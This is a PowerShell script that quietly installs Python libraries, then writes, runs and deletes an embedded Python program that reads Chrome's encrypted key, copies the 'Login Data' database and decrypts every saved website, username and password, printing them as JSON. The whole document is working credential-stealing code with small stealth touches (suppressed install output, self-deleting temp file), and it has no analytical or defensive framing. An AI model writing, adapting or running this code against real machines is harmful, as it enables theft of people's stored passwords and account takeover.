$ErrorActionPreference = 'Stop'

# Check Python
try { python --version >$null 2>&1 } catch { 
    Write-Host "⚠️ Install Python first: https://python.org"
    exit 
}

# Install requirements
python -m pip install --upgrade pip >$null 2>&1
python -m pip install pycryptodome pypiwin32 requests >$null 2>&1

# Fixed Python script with all required imports
$pythonCode = @'
import os
import json
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    local_state_path = os.path.join(os.environ["LOCALAPPDATA"], 
                                  "Google", "Chrome", 
                                  "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
    db_path = os.path.join(os.environ["LOCALAPPDATA"], 
                         "Google", "Chrome", 
                         "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    results = []
    for row in cursor.fetchall():
        url, username, password = row
        decrypted_password = decrypt_password(password, key)
        if username or decrypted_password:
            results.append({
                "url": url,
                "username": username,
                "password": decrypted_password
            })
    
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    
    print(json.dumps(results, indent=4))

if __name__ == "__main__":
    main()
'@

# Execute the script
$tempFile = "$env:TEMP\chrome_passwords_$(Get-Date -Format 'yyyyMMddHHmmss').py"
try {
    [System.IO.File]::WriteAllText($tempFile, $pythonCode)
    python $tempFile
} finally {
    Remove-Item $tempFile -ErrorAction SilentlyContinue
}
